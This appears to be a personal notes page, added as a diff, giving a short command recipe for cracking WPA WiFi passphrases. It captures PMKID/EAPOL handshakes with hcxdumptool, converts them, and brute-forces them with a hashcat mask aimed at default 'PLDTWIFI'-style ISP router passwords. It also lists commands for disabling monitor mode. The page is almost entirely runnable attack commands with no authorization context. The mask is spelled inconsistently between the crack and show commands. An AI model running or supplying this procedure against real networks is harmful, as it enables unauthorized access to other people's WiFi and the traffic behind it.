@@ -1,0 +1,29 @@
+= Cracking WiFi (PMKID/EAPOL)
+
+Capturing and cracking WPA handshakes (PMKID + EAPOL) to recover the passphrase.
+Relates to the xref:pairwise-transient-key.adoc[Pairwise Transient Key].
+
+Requirements:
+
+* aircrack-ng
+* hcxtools
+* hcxdumptool
+* hashcat
+
+. `sudo hcxdumptool -i wlp6s0f3u2 -w WIFIs.pcapng`
+. `hcxpcapngtool -o WIFIs.hc22000 WIFIs.pcapng`
+. `hashcat -m 22000 WIFIs.hc22000 -a 3 -1 '?d?l' 'PLDTIFI?1?1?1?1?1' -w 3`
+
+Use `hashcat -m 22000 WIFIs.hc22000 -a 3 -1 '?d?l' 'PLDTWIFI?1?1?1?1?1' -w 3 --show` to show all cracked hashes.
+
+== Disabling Monitor Mode
+
+. `ip link set wlo1 down`
+. `iw wlo1 set type managed`
+. `ip link set wlo1 up`
+
+Check with `iwconfig` if Mode is set to *Managed*.
+
+== Source
+
+* https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2[hashcat — Cracking WPA/WPA2]
